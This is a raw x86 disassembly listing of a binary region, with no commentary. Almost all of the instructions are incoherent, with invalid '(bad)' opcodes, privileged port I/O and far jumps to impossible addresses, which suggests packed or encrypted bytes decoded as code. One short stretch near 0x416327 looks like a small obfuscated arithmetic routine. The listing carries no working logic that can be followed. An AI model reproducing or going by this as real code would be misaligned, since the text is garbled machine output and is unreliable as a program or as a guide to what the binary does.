  415f25:	xor    ch,BYTE PTR [esi-0x48b34bc6]
  415f2b:	inc    edx
  415f2c:	imul   edx,edi,0xcb6054e3
  415f32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f33:	ins    BYTE PTR es:[edi],dx
  415f34:	(bad)  
  415f35:	sar    BYTE PTR [esi-0x41413b72],0xbf
  415f3c:	outs   dx,BYTE PTR ds:[esi]
  415f3d:	out    dx,eax
  415f3e:	xchg   ebx,eax
  415f3f:	jae    0x415f8b
  415f41:	mov    ah,0x29
  415f43:	sub    ah,BYTE PTR [ecx+0x30]
  415f46:	cmp    al,0x38
  415f48:	(bad)  
  415f49:	stos   DWORD PTR es:[edi],eax
  415f4a:	jmp    0x2b9fa4d2
  415f4f:	lods   al,BYTE PTR ds:[esi]
  415f50:	dec    esi
  415f51:	inc    eax
  415f52:	lds    esp,FWORD PTR [ecx-0x7e]
  415f55:	mov    al,ds:0xcd293a5
  415f5a:	out    dx,al
  415f5b:	cmc    
  415f5c:	ds mov ecx,0xec6e93f6
  415f62:	and    eax,0x6cee3859
  415f67:	sub    esi,DWORD PTR ds:0xa2f8eb56
  415f6d:	nop
  415f6e:	jle    0x415efa
  415f70:	or     ah,al
  415f72:	pop    ds
  415f73:	loope  0x415fd9
  415f75:	jne    0x415f8e
  415f77:	jg     0x415f66
  415f79:	das    
  415f7a:	aas    
  415f7b:	or     BYTE PTR [esi+0x2fc51390],cl
  415f81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f82:	mov    ch,0xba
  415f84:	sub    DWORD PTR [ebx],eax
  415f86:	in     al,0xf
  415f88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f89:	push   ss
  415f8a:	or     BYTE PTR [eax],dh
  415f8c:	mov    ecx,0x947d4c4f
  415f91:	cmc    
  415f92:	pop    esp
  415f93:	pop    ds
  415f94:	and    DWORD PTR [edx+esi*2+0x23],edi
  415f98:	mov    DWORD PTR [edx+0x10e3aa83],ebx
  415f9e:	mov    bh,0xfc
  415fa0:	shl    DWORD PTR [eax],cl
  415fa2:	sbb    bh,ch
  415fa4:	or     BYTE PTR [ebp-0x837cabb],dh
  415faa:	je     0x415fa5
  415fac:	repnz pusha 
  415fae:	sub    eax,DWORD PTR [esi+edi*2]
  415fb1:	daa    
  415fb2:	lea    edx,[ebp+0x4]
  415fb5:	aad    0x47
  415fb7:	std    
  415fb8:	in     eax,dx
  415fb9:	repnz sahf 
  415fbb:	xchg   edi,esp
  415fbd:	xchg   ebp,eax
  415fbe:	xor    eax,0x5bdc5d84
  415fc3:	inc    ebp
  415fc4:	mov    al,0x21
  415fc6:	cs cwde 
  415fc8:	rcl    BYTE PTR [edx+0x2a],0xdb
  415fcc:	mov    DWORD PTR [esi-0x2d],edx
  415fcf:	or     BYTE PTR [eax],ah
  415fd1:	sbb    al,0x42
  415fd3:	pop    ds
  415fd4:	xor    BYTE PTR [edi+0x31502704],cl
  415fda:	sub    al,0x7c
  415fdc:	add    DWORD PTR [edx-0x29],eax
  415fdf:	jecxz  0x415fd4
  415fe1:	jge    0x416005
  415fe3:	and    ecx,eax
  415fe5:	xor    ebx,edx
  415fe7:	jmp    0x416037
  415fe9:	iret   
  415fea:	sub    ch,BYTE PTR [edi]
  415fec:	add    eax,DWORD PTR [ebp-0x6f092c58]
  415ff2:	push   edi
  415ff3:	aam    0x42
  415ff5:	mov    ds:0x89f939e,al
  415ffa:	push   0x52
  415ffc:	mov    esp,0x689e3a4f
  416001:	sbb    BYTE PTR [ecx-0x2f121d88],al
  416007:	jne    0x41605c
  416009:	nop
  41600a:	pop    ss
  41600b:	out    dx,eax
  41600c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41600d:	add    esi,edi
  41600f:	xchg   DWORD PTR [esi+0x41],ebp
  416012:	adc    ah,BYTE PTR [edx+0x3aa31f37]
  416018:	mov    DWORD PTR [ebx+0xf],ebp
  41601b:	sahf   
  41601c:	jge    0x415fc6
  41601e:	lahf   
  41601f:	adc    eax,0x7cf29e3e
  416024:	fistp  QWORD PTR [edx]
  416026:	daa    
  416027:	pushf  
  416028:	fst    DWORD PTR [ecx+0x38]
  41602b:	ffreep st(4)
  41602d:	inc    eax
  41602e:	ficom  DWORD PTR [ebx+0x647137d0]
  416034:	or     ch,ah
  416036:	xlat   BYTE PTR ds:[ebx]
  416037:	outs   dx,BYTE PTR ds:[esi]
  416038:	leave  
  416039:	xor    al,0x4f
  41603b:	cmp    eax,edi
  41603d:	pop    ecx
  41603e:	jo     0x416077
  416040:	test   DWORD PTR [eax],ebp
  416042:	jg     0x416091
  416044:	bound  edx,QWORD PTR [edx+0x5ce79ab0]
  41604a:	rol    dl,0x4a
  41604d:	outs   dx,DWORD PTR ds:[esi]
  41604e:	(bad)  
  41604f:	repz std 
  416051:	in     al,0xe2
  416053:	fcomp  st(5)
  416055:	xlat   BYTE PTR ds:[ebx]
  416056:	jecxz  0x416074
  416058:	xchg   esi,ecx
  41605a:	repnz xlat BYTE PTR ds:[ebx]
  41605c:	inc    esi
  41605d:	sbb    eax,0xd94234b1
  416062:	dec    ecx
  416063:	test   eax,0xbd116720
  416068:	ror    BYTE PTR ss:[edi],0xdd
  41606c:	int3   
  41606d:	mov    edx,esp
  41606f:	sbb    bh,dl
  416071:	mov    edx,0xfa889c75
  416076:	mov    eax,es
  416078:	in     al,dx
  416079:	or     eax,0xd4e9e86d
  41607e:	pop    dx
  416080:	popa   
  416081:	mov    bl,0x18
  416083:	push   cs
  416084:	sbb    eax,0x23686184
  416089:	cmc    
  41608a:	sub    ebp,edi
  41608c:	dec    ebp
  41608d:	dec    ebx
  41608e:	lahf   
  41608f:	jb     0x41603f
  416091:	push   ebx
  416092:	cmp    DWORD PTR [eax+0x57],ecx
  416095:	les    ecx,FWORD PTR [ebx+0x30b7fd04]
  41609b:	xor    al,0x33
  41609d:	es mov ch,0x4a
  4160a0:	sbb    bh,BYTE PTR [esi]
  4160a2:	push   edi
  4160a3:	push   0xfc53ca61
  4160a8:	jmp    0x4160ce
  4160aa:	xor    eax,0xfc72cbd9
  4160af:	jecxz  0x4160c9
  4160b1:	popf   
  4160b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160b3:	cld    
  4160b4:	mov    al,ds:0xc3d7aea4
  4160b9:	push   0xc4001117
  4160be:	or     eax,0xb699b272
  4160c3:	retf   0xed49
  4160c6:	in     al,dx
  4160c7:	jl     0x416103
  4160c9:	pop    esi
  4160ca:	ins    BYTE PTR es:[edi],dx
  4160cb:	aas    
  4160cc:	cmp    al,BYTE PTR [edx-0x39]
  4160cf:	push   ebx
  4160d0:	jl     0x4160d2
  4160d2:	jmp    0xc286e308
  4160d7:	push   cs
  4160d8:	scas   eax,DWORD PTR es:[edi]
  4160d9:	mov    ch,0x86
  4160db:	xchg   BYTE PTR [edi-0x6845855c],dh
  4160e1:	enter  0x9b2,0xff
  4160e5:	pop    edx
  4160e6:	loopne 0x416098
  4160e8:	push   edi
  4160e9:	hlt    
  4160ea:	xor    edi,DWORD PTR [edx-0x2a9b7c89]
  4160f0:	jmp    0xe36:0xe3cddc8c
  4160f7:	(bad)  [eax+0x6f]
  4160fa:	hlt    
  4160fb:	push   ecx
  4160fc:	out    dx,eax
  4160fd:	out    dx,al
  4160fe:	mov    cl,0xc1
  416100:	ficomp DWORD PTR [ebp+0x5ee33792]
  416106:	push   es
  416107:	(bad)  
  416108:	ins    DWORD PTR es:[edi],dx
  416109:	mov    al,0x44
  41610b:	out    dx,eax
  41610c:	es dec edx
  41610e:	and    eax,0xeb8c8ce9
  416113:	fsub   st,st(5)
  416115:	mov    dh,0xde
  416117:	jnp    0x41612c
  416119:	test   eax,0x39a4e076
  41611e:	xor    bl,BYTE PTR [ecx]
  416120:	adc    al,0xa4
  416122:	fdivr  QWORD PTR [esi-0x57]
  416125:	mov    cl,0x79
  416127:	cmc    
  416128:	outs   dx,BYTE PTR ds:[esi]
  416129:	test   DWORD PTR [edx-0x4b],edx
  41612c:	mov    cs,WORD PTR fs:[ecx+0x6c]
  416130:	xor    DWORD PTR [edi+0x7c47d3f],eax
  416136:	out    0x5e,al
  416138:	ja     0x41610e
  41613a:	dec    esp
  41613b:	scas   al,BYTE PTR es:[edi]
  41613c:	in     al,0x7c
  41613e:	test   al,0x66
  416140:	sbb    DWORD PTR [eax],edi
  416142:	and    edi,edi
  416144:	repz mov dh,0x6
  416147:	cmp    eax,0x4eb3ebe8
  41614c:	ins    BYTE PTR es:[edi],dx
  41614d:	bound  ebx,QWORD PTR [ebx+edx*1-0x45]
  416151:	(bad)  
  416152:	sar    BYTE PTR [edx-0x4dd95f5c],0x87
  416159:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41615a:	jle    0x4160e1
  41615c:	lods   eax,DWORD PTR ds:[esi]
  41615d:	int    0xe5
  41615f:	rcr    BYTE PTR [edx+0x3e17bea7],cl
  416165:	cmp    eax,DWORD PTR [ebx-0x4a]
  416168:	push   edx
  416169:	sbb    BYTE PTR [ebx+esi*1],ch
  41616c:	xor    eax,0x1519e18b
  416171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416172:	dec    edx
  416173:	in     eax,dx
  416174:	cmp    BYTE PTR [ebx],dl
  416176:	jp     0x41616a
  416178:	lock xor al,0x55
  41617b:	xchg   edi,eax
  41617c:	aaa    
  41617d:	cmp    eax,0xf7fba031
  416182:	repnz push eax
  416184:	push   ds
  416185:	rol    BYTE PTR ds:0xc8cb720c,1
  41618b:	mov    ebx,?
  41618d:	or     DWORD PTR [ebx+0x1a],esp
  416190:	add    eax,0x75a3e1e2
  416195:	push   edx
  416196:	ja     0x41619b
  416198:	std    
  416199:	pop    ds
  41619a:	pop    eax
  41619b:	add    al,0xa8
  41619d:	sar    BYTE PTR [esi],1
  41619f:	dec    eax
  4161a0:	sub    BYTE PTR [eax-0x2e64505],ch
  4161a6:	add    eax,0xae66be7b
  4161ab:	dec    ecx
  4161ac:	fs in  eax,0xc5
  4161af:	xor    BYTE PTR ds:0x52a94fce,0x40
  4161b6:	ja     0x416157
  4161b8:	aad    0xd8
  4161ba:	icebp  
  4161bb:	dec    esi
  4161bc:	stc    
  4161bd:	xchg   ecx,eax
  4161be:	add    dh,BYTE PTR [edx+edi*1-0x636648cd]
  4161c5:	mov    ebp,0x8afdd752
  4161ca:	loope  0x4161fc
  4161cc:	pop    ebp
  4161cd:	jge    0x41616c
  4161cf:	clc    
  4161d0:	ins    DWORD PTR es:[edi],dx
  4161d1:	add    al,ch
  4161d3:	adc    dh,ah
  4161d5:	out    0x64,al
  4161d7:	les    ebx,FWORD PTR [edi-0x49]
  4161da:	mov    bl,0xf1
  4161dc:	popf   
  4161dd:	lods   al,BYTE PTR ds:[esi]
  4161de:	jo     0x4161f3
  4161e0:	icebp  
  4161e1:	push   es
  4161e2:	mov    ecx,0x54f2e5fc
  4161e7:	out    dx,eax
  4161e8:	cld    
  4161e9:	not    DWORD PTR [ebx]
  4161eb:	aam    0xaa
  4161ed:	gs xchg esi,eax
  4161ef:	mov    ebx,0x57ed62da
  4161f4:	xlat   BYTE PTR ds:[ebx]
  4161f5:	sbb    dl,BYTE PTR [edi-0x1e]
  4161f8:	mov    BYTE PTR [eax],bh
  4161fa:	jl     0x4161c4
  4161fc:	push   esp
  4161fd:	add    dl,BYTE PTR [edi+0x54]
  416200:	jb     0x416268
  416202:	popa   
  416203:	dec    ecx
  416204:	mov    al,0x8a
  416206:	mov    bl,0xd3
  416208:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416209:	jno    0x41621d
  41620b:	add    ebp,DWORD PTR [edi+0xa]
  41620e:	aad    0x1f
  416210:	addr16 rcl esi,cl
  416213:	mov    ds:0x3f98a154,eax
  416218:	repnz daa 
  41621a:	pop    edx
  41621b:	push   cs
  41621c:	out    0x9,eax
  41621e:	mov    ah,0xf7
  416220:	nop
  416221:	hlt    
  416222:	pop    ebx
  416223:	xchg   edi,eax
  416224:	xchg   ebx,eax
  416225:	pop    ebp
  416226:	icebp  
  416227:	hlt    
  416228:	jge    0x416200
  41622a:	fistp  DWORD PTR [eax-0x38]
  41622d:	xchg   DWORD PTR [edi-0x54973b3e],ecx
  416233:	lods   al,BYTE PTR ds:[esi]
  416234:	leave  
  416235:	push   0xffffffe1
  416237:	sbb    eax,0xbf9fb215
  41623c:	mov    ah,BYTE PTR [esi]
  41623e:	dec    esp
  41623f:	lahf   
  416240:	jg     0x416210
  416242:	xchg   esi,eax
  416243:	and    esp,DWORD PTR [edi]
  416245:	mov    ecx,0x567f651
  41624a:	rol    BYTE PTR [ebp-0x17b45167],cl
  416250:	fild   DWORD PTR [edi+0x3e9e4dcf]
  416256:	imul   esp,DWORD PTR [edx-0xaa0ddef],0x68792efb
  416260:	dec    ecx
  416261:	sub    eax,0x18767d64
  416266:	cs push ebx
  416268:	outs   dx,DWORD PTR ds:[esi]
  416269:	dec    eax
  41626a:	mov    ecx,0xea1d264c
  41626f:	pusha  
  416270:	shl    al,1
  416272:	jae    0x4162bb
  416274:	and    al,0xc3
  416276:	add    BYTE PTR [eax-0x2a6867a9],ch
  41627c:	or     edi,ecx
  41627e:	cmp    edx,DWORD PTR [edi]
  416280:	stos   DWORD PTR es:[edi],eax
  416281:	sbb    al,0x8
  416283:	out    0xd4,al
  416285:	imul   ebp,DWORD PTR [esi],0x8f610930
  41628b:	adc    ebx,DWORD PTR [esi-0x69]
  41628e:	pop    esp
  41628f:	into   
  416290:	sbb    DWORD PTR [ecx],ecx
  416292:	sbb    BYTE PTR [ebp+0x6b6b5c8b],bl
  416298:	hlt    
  416299:	loopne 0x4162f1
  41629b:	ror    BYTE PTR [edi-0x5b0da4ec],cl
  4162a1:	pop    ss
  4162a2:	sub    al,cl
  4162a4:	outs   dx,BYTE PTR ds:[esi]
  4162a5:	and    BYTE PTR [eax-0x1c8f1db5],cl
  4162ab:	or     BYTE PTR [esi+ecx*8-0x9],dl
  4162af:	inc    esi
  4162b0:	call   0x73e2:0x6484dd4f
  4162b7:	lods   al,BYTE PTR ds:[esi]
  4162b8:	jo     0x4162e7
  4162ba:	xchg   esi,eax
  4162bb:	fwait
  4162bc:	jle    0x4162e8
  4162be:	mov    dh,0xb3
  4162c0:	shl    BYTE PTR [ecx-0x3163770e],1
  4162c6:	aam    0x3e
  4162c8:	ss aaa 
  4162ca:	pop    esi
  4162cb:	fwait
  4162cc:	daa    
  4162cd:	lahf   
  4162ce:	mov    ds:0x86352c9a,al
  4162d3:	push   ecx
  4162d4:	add    edi,edi
  4162d6:	test   ebp,0xc1362e67
  4162dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162dd:	loopne 0x4162f1
  4162df:	inc    ebx
  4162e0:	fsub   st,st(3)
  4162e2:	cdq    
  4162e3:	jmp    0x1bdbf86f
  4162e8:	adc    al,0x36
  4162ea:	loopne 0x41629f
  4162ec:	adc    al,0xd4
  4162ee:	sti    
  4162ef:	pop    edx
  4162f0:	xor    edi,DWORD PTR [ecx]
  4162f2:	mov    al,ds:0xd7fca155
  4162f7:	fidivr WORD PTR [eax-0x27471a0f]
  4162fd:	mov    eax,0x5d6eabba
  416302:	xor    eax,DWORD PTR [ecx+0x2f]
  416305:	fadd   QWORD PTR [ecx+esi*4]
  416308:	aas    
  416309:	int3   
  41630a:	enter  0x888,0xe5
  41630e:	adc    ch,ah
  416310:	cmc    
  416311:	inc    ebx
  416312:	sbb    al,0xf9
  416314:	and    eax,0x8e6e1d7f
  416319:	jp     0x4162fd
  41631b:	jno    0x4162c2
  41631d:	mov    BYTE PTR [esi-0x6604b981],0xbd
  416324:	mov    ch,0x77
  416326:	icebp  
  416327:	mov    DWORD PTR [ebp-0x2c],0x347d
  41632e:	mov    eax,DWORD PTR [ebp-0x2c]
  416331:	mov    edx,DWORD PTR [ebp-0x28]
  416334:	mov    ebx,DWORD PTR [ebp-0x24]
  416337:	sub    eax,0x24b3
  41633c:	imul   eax,edx
  41633f:	xor    eax,0x74ef
  416344:	xor    edx,edx
  416346:	div    ebx
  416348:	mov    edx,DWORD PTR [ebp-0x20]
  41634b:	mov    ebx,DWORD PTR [ebp+0x8]
  41634e:	push   0x20
  416350:	and    eax,edx
  416352:	mov    edx,edi
  416354:	sub    edx,eax
  416356:	sub    edx,0x683
  41635c:	mov    DWORD PTR [ebp-0x2c],edx
  41635f:	mov    eax,DWORD PTR [ebp-0x30]
  416362:	mov    edx,DWORD PTR [ebp-0x34]
  416365:	xor    al,dl
  416367:	mov    edx,DWORD PTR [ebp-0x2c]
  41636a:	xor    al,0x58
  41636c:	and    al,0xd8
  41636e:	add    al,BYTE PTR [ebp+0xc]
  416371:	add    al,0x28
  416373:	jmp    0x41677c
  416378:	mov    ebx,0x41d6c237
  41637d:	cmp    edi,DWORD PTR [ebx-0x6192d245]
  416383:	nop
  416384:	dec    ebp
  416385:	loope  0x416360
  416387:	jecxz  0x4163c5
  416389:	int3   
  41638a:	sar    BYTE PTR [esi-0x41413b72],0xd5
  416391:	push   0x35
  416393:	xchg   esp,eax
  416394:	pushf  
  416395:	inc    esi
  416396:	jl     0x416386
  416398:	inc    edi
  416399:	pusha  
  41639a:	inc    ebx
  41639b:	clc    
  41639c:	mov    dl,BYTE PTR [eax+0x76]
  41639f:	ja     0x416332
  4163a1:	std    
  4163a2:	xor    dl,cl
  4163a4:	inc    esi
  4163a5:	xor    DWORD PTR [eax+0x1468fad],edx
  4163ab:	inc    esi
  4163ac:	arpl   WORD PTR [eax-0x71b990d4],ax
  4163b2:	dec    ecx
  4163b3:	mov    esp,0x13f67bb9
  4163b8:	or     eax,0xf67ff605
  4163bd:	add    BYTE PTR [edx],al
  4163bf:	fisttp QWORD PTR [ebx+eax*4]
  4163c2:	outs   dx,BYTE PTR ds:[esi]
  4163c3:	repnz adc esp,0x537a220d
  4163ca:	in     al,dx
  4163cb:	lds    esp,FWORD PTR [ecx-0x57]
  4163ce:	jge    0x416412
  4163d0:	xchg   ecx,eax
  4163d1:	pop    esp
  4163d2:	(bad)  
  4163d4:	mov    BYTE PTR [ebp-0x7],al
  4163d7:	ror    DWORD PTR [bp+di+0x49],cl
  4163db:	retf   
  4163dc:	cld    
  4163dd:	in     al,dx
  4163de:	(bad)
  4163e1:	sbb    edi,ebp
  4163e3:	xchg   DWORD PTR [edi+0x608d122f],esp
  4163e9:	ret    
  4163ea:	out    dx,al
  4163eb:	idiv   BYTE PTR es:[ecx]
  4163ee:	psubusw mm3,QWORD PTR [bx+si-0x348f]
  4163f4:	lahf   
  4163f5:	cli    
  4163f6:	inc    edx
  4163f7:	(bad)  
  4163f8:	cs fwait
  4163fa:	out    dx,al
  4163fb:	push   esp
  4163fc:	jns    0x416381
  4163fe:	xchg   ecx,eax
  4163ff:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  416401:	xor    ecx,0x53
  416404:	jle    0x416407
  416406:	cmp    ebx,edx
  416408:	jns    0x4163e2
  41640a:	fwait
  41640b:	inc    edx
  41640c:	xor    BYTE PTR [esi-0x2],0x15
  416410:	mov    edi,0x859e6c48
  416415:	outs   dx,DWORD PTR ds:[esi]
  416416:	add    esi,DWORD PTR [esi+esi*4-0x38e781f7]
  41641d:	mov    edx,0x2db4ed42
  416422:	mov    cl,BYTE PTR [esi-0x6419b093]
  416428:	jb     0x416435
  41642a:	sub    edi,edx
  41642c:	cld    
  41642d:	sub    ebp,esi
  41642f:	push   ebp
  416430:	cmp    al,0x7e
  416432:	sub    al,BYTE PTR [ebx]
  416434:	jns    0x4163e6
  416436:	lods   al,BYTE PTR ds:[esi]
  416437:	pusha  
  416438:	(bad)  
  416439:	mov    ds:0x32a5bc13,al
  41643e:	add    eax,0xd7e04f2f
  416443:	arpl   di,cx
  416445:	retf   
  416446:	adc    ch,dh
  416448:	loopne 0x4163cf
  41644a:	mov    ebx,DWORD PTR [ebp-0x43]
  41644d:	mov    bh,0x64
  41644f:	xor    cl,BYTE PTR [ebx-0x5c1dc619]
  416455:	jecxz  0x41646a
  416457:	push   edi
  416458:	inc    ecx
  416459:	xor    eax,0x242f9872
  41645e:	mov    ch,dh
  416460:	and    DWORD PTR [edi],ecx
  416462:	sub    bh,ch
  416464:	jle    0x4163e6
  416466:	push   edi
  416467:	sub    eax,0x31e34256
  41646c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41646d:	mov    ebx,0xeb0d6edd
  416472:	adc    DWORD PTR [esi+0x49dd6177],ecx
  416478:	(bad)  
  416479:	sahf   
  41647a:	test   DWORD PTR [esi-0x3475ce9e],ecx
  416480:	or     eax,0xfbaac7f0
  416485:	or     eax,0x73ce35fe
  41648a:	jne    0x416507
  41648c:	scas   eax,DWORD PTR es:[edi]
  41648d:	xchg   esp,eax
  41648e:	dec    esi
  41648f:	mov    esp,0xb6885b68
  416494:	push   ss
  416495:	and    BYTE PTR [esi+0x78],al
  416498:	sbb    al,0x76
  41649a:	aaa    
  41649b:	dec    ecx
  41649c:	ss jg  0x416515
  41649f:	enter  0xf143,0x49
  4164a3:	xor    al,0xdf
  4164a5:	pop    DWORD PTR [ebx+0x6dc02dde]
  4164ab:	xor    ah,dh
  4164ad:	add    BYTE PTR [eax],bh
  4164af:	mov    ds:0xa48dac85,eax
  4164b4:	outs   dx,DWORD PTR ds:[esi]
  4164b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164b6:	cmp    DWORD PTR [edx-0x1f],ebp
  4164b9:	fcomp  QWORD PTR [ecx]
  4164bb:	mov    al,ds:0x6727e376
  4164c0:	push   eax
  4164c1:	sub    BYTE PTR [esi+0x1],bl
  4164c4:	cmp    DWORD PTR [ecx+0x4b],ebp
  4164c7:	lock mov dl,0x41
  4164ca:	push   0x4316f70d
  4164cf:	stos   DWORD PTR es:[edi],eax
  4164d0:	and    BYTE PTR [esi-0x4c37b0db],dh
  4164d6:	popa   
  4164d7:	push   ebx
  4164d8:	aas    
  4164d9:	pushf  
  4164da:	cld    
  4164db:	stc    
  4164dc:	lea    edi,[eax-0x5bc640f3]
  4164e2:	and    DWORD PTR [edx-0x30cd9516],ebp
  4164e8:	call   0x45646905
  4164ed:	jae    0x41654f
  4164ef:	fmul   DWORD PTR [ecx-0x255a908]
  4164f5:	outs   dx,DWORD PTR ds:[esi]
  4164f6:	xorps  xmm6,XMMWORD PTR [edx+0x21]
  4164fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164fb:	dec    esi
  4164fc:	pop    ecx
  4164fd:	rol    BYTE PTR [esi-0x7a119b4a],cl
  416503:	ret    
  416504:	xchg   DWORD PTR [esi-0x29],esi
  416507:	or     al,0xf1
  416509:	(bad)  
  41650a:	cmc    
  41650b:	inc    esi
  41650c:	stos   BYTE PTR es:[edi],al
  41650d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41650e:	cs das 
  416510:	stos   DWORD PTR es:[di],eax
  416512:	mov    al,BYTE PTR [ecx+ebx*2-0x68]
  416516:	stos   DWORD PTR es:[edi],eax
  416517:	jecxz  0x416580
  416519:	mov    ebp,0x6f1f6af1
  41651e:	mov    ebp,0x9a9a57ad
  416523:	jl     0x41656f
  416525:	cdq    
  416526:	push   edx
  416527:	imul   esp,DWORD PTR [edx+0xbe4b983],0x7e
  41652e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41652f:	xor    edi,DWORD PTR [edi-0x3bb465f]
  416535:	call   0x83e6:0x5d9b5fcc
  41653c:	shr    DWORD PTR [ebx-0x2d3cccab],1
  416542:	jle    0x41655b
  416544:	jnp    0x4165a0
  416546:	pop    ebx
  416547:	jnp    0x41659c
  416549:	ret    0x5c59
  41654c:	icebp  
  41654d:	pop    edi
  41654e:	(bad)  
  41654f:	adc    BYTE PTR ds:0x560f0198,bh
  416555:	mov    al,al
  416557:	ins    DWORD PTR es:[edi],dx
  416558:	jne    0x416582
  41655a:	mov    eax,0xb9bf92e5
  41655f:	mov    BYTE PTR [esi],dl
  416561:	fcomp  QWORD PTR [esi-0x59]
  416564:	mov    dl,0xc5
  416566:	lahf   
  416567:	pop    eax
  416568:	inc    ebp
  416569:	dec    eax
  41656a:	mov    al,0x2f
  41656c:	jecxz  0x41654e
  41656e:	cmp    al,0x55
  416570:	inc    ecx
  416571:	dec    ebx
  416572:	xor    edi,DWORD PTR [edi+eiz*8]
  416575:	sbb    eax,0x249f24ac
  41657a:	(bad)  
  41657b:	push   cs
  41657c:	xor    eax,0x3b791183
  416581:	bound  edi,QWORD PTR [ebx-0x28]
  416584:	pop    esi
  416585:	pop    ss
  416586:	sahf   
  416587:	daa    
  416588:	iret   
  416589:	leave  
  41658a:	adc    ah,ch
  41658c:	cmovbe esi,DWORD PTR [esi]
  41658f:	add    DWORD PTR [edi],eax
  416591:	shl    DWORD PTR [eax-0x49],cl
  416594:	jecxz  0x416606
  416596:	repnz icebp 
  416598:	ja     0x41657b
  41659a:	pusha  
  41659b:	out    dx,al
  41659c:	stos   DWORD PTR es:[edi],eax
  41659d:	push   0xffffff8f
  41659f:	pop    ecx
  4165a0:	into   
  4165a1:	aad    0x79
  4165a3:	mov    BYTE PTR [esp+ecx*1+0x70692562],al
  4165aa:	jbe    0x4165a4
  4165ac:	enter  0x8d41,0x5c
  4165b0:	retf   
  4165b1:	push   0x18
  4165b3:	in     al,0x41
  4165b5:	jmp    0xf9b1c196
  4165ba:	dec    ecx
  4165bb:	ret    
  4165bc:	pushf  
  4165bd:	xor    eax,0x214a5c76
  4165c2:	mov    ecx,0x893389e
  4165c7:	xchg   DWORD PTR [ebx],ebx
  4165c9:	out    0x3c,eax
  4165cb:	mov    al,ds:0x535237d3
  4165d0:	pop    edx
  4165d1:	cmp    eax,0xc311a255
  4165d6:	jmp    0x4165dc
  4165d8:	add    DWORD PTR [esi],ebx
  4165da:	adc    al,0xe8
  4165dc:	sar    BYTE PTR cs:[esi+eiz*2],0x4e
  4165e1:	or     cl,bh
  4165e3:	pop    esi
  4165e4:	and    al,0x61
  4165e6:	ret    
  4165e7:	stos   DWORD PTR es:[edi],eax
  4165e8:	dec    esi
  4165e9:	outs   dx,DWORD PTR ds:[esi]
  4165ea:	shl    ecx,cl
  4165ec:	lahf   
  4165ed:	push   edx
  4165ee:	add    dl,BYTE PTR [edx+eiz*2+0x51750d74]
  4165f5:	adc    eax,0x8f65674f
  4165fa:	nop
  4165fb:	inc    ebx
  4165fc:	fcmovnu st,st(3)
  4165fe:	std    
  4165ff:	dec    eax
  416600:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416601:	data16 loope 0x416632
  416604:	xchg   edx,eax
  416605:	sbb    eax,0x9013f903
  41660a:	inc    esp
  41660b:	dec    edx
  41660c:	fiadd  DWORD PTR [eax]
  41660e:	xchg   ebx,eax
  41660f:	je     0x41668e
  416611:	nop
  416612:	mov    ch,0x89
  416614:	loope  0x41668e
  416616:	inc    esp
  416617:	sbb    ebp,DWORD PTR [esi-0x32eed772]
  41661d:	mov    dh,ch
  41661f:	test   dh,0xaa
  416622:	(bad)  [eax]
  416624:	dec    esp
  416625:	sbb    eax,DWORD PTR [ebp+0x31]
  416628:	lahf   
  416629:	jns    0x416689
  41662b:	xchg   ebx,eax
  41662c:	sub    al,0x74
  41662e:	fcom   QWORD PTR [eax]
  416630:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416631:	outs   dx,DWORD PTR ds:[esi]
  416632:	inc    ebx
  416633:	jmp    0x55031386
  416638:	mov    ecx,0x79b065db
  41663d:	mov    al,0xa7
  41663f:	retf   0x12fd
  416642:	adc    BYTE PTR [esi-0x57],bl
  416645:	jp     0x416664
  416647:	xchg   ecx,eax
  416648:	mov    esi,0x642be5f
  41664d:	sbb    DWORD PTR [edi+0xc8fb611],ebp
  416653:	loope  0x416687
  416655:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416656:	ja     0x416642
  416658:	and    ecx,edx
  41665a:	and    ebx,0x32
  41665d:	cmp    bl,cl
  41665f:	xchg   esp,eax
  416660:	loop   0x416666
  416662:	mov    edx,0xd5f5ed9b
  416667:	add    ecx,0xffffff83
  41666a:	jae    0x41669d
  41666c:	push   DWORD PTR [ebx]
  41666e:	aam    0xc8
  416670:	dec    edi
  416671:	inc    eax
  416672:	push   ebx
  416673:	mov    dl,0xe2
  416675:	ficomp WORD PTR [ebx+0x21f64a24]
  41667b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41667c:	les    eax,FWORD PTR [ebp-0x21]
  41667f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416680:	loope  0x4166b5
  416682:	fwait
  416683:	jo     0x4166d7
  416685:	in     eax,dx
  416686:	rol    bl,1
  416688:	sbb    ecx,DWORD PTR [ecx]
  41668a:	sub    DWORD PTR [eax],0xfffffff4
  41668d:	fnclex 
  41668f:	das    
  416690:	scas   eax,DWORD PTR es:[edi]
  416691:	add    eax,0x1f270537
  416696:	pop    ss
  416697:	sahf   
  416698:	je     0x416643
  41669a:	inc    ecx
  41669b:	in     eax,0x18
  41669d:	sbb    ah,BYTE PTR ds:0xbdbfa86f
  4166a3:	daa    
  4166a4:	dec    eax
  4166a5:	es int 0xae
  4166a8:	outs   dx,DWORD PTR ds:[esi]
  4166a9:	hlt    
  4166aa:	inc    esi
  4166ab:	outs   dx,DWORD PTR ds:[esi]
  4166ac:	mov    al,0x7c
  4166ae:	je     0x416690
  4166b0:	inc    esp
  4166b1:	mov    dh,0x71
  4166b3:	jnp    0x4166e5
  4166b5:	sub    ah,ah
  4166b7:	xor    bh,bl
  4166b9:	adc    ah,0x58
  4166bc:	and    esp,ebp
